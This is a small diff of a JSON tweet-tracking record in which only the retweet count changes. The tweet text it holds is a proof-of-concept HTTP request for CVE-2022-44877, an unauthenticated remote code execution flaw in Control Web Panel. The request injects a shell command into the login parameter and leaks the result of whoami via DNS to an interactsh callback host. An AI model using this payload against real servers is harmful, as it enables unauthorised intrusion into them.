@@ -28,7 +28,7 @@
     "tweetfavorites": 125,
     "tweetquotes": 1,
     "tweetreplies": 3,
-    "tweetretweets": 25,
+    "tweetretweets": 24,
     "tweettext": "CVE-2022-44877\nControl Web Panel Unauth RCE\nPOC usage:\nPOST /login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}}) HTTP/1.1\nHost: vuln\nContent-Type: application/x-www-form-urlencoded\n\nusername=root&amp;password=toor&amp;commit=Login https://t.co/CRLGltneZQ",
     "tweettime": "2023-05-27, 06:59:56",
     "tweeturl": "https://twitter.com/freeprogrammers/status/1662352921831284736",
